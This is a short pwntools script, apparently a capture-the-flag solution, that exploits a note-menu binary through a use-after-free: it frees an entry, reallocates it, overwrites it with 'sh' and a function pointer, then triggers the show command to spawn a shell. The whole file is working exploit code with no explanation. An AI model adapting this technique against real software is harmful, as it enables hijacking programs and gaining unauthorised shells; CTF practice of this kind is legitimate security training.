from pwn import *
io = gdb.debug('./pwn')

def add():
    io.sendlineafter(b':',b'1')
    
def edit(idx,text):
    io.sendlineafter(b':',b'2')
    io.sendlineafter(b'page\n',str(idx))
    io.sendlineafter(b'strings\n',text)

def free(idx):
    io.sendlineafter(b':',b'3')
    io.sendlineafter(b'page\n',str(idx))

def show(idx):
    io.sendlineafter(b':',b'4')
    io.sendlineafter(b'page\n',str(idx))
    
add()   #0
free(0)
add()   #1
edit(1,b'sh\x00\x00'+p32(0x8048642))
show(0)

io.interactive()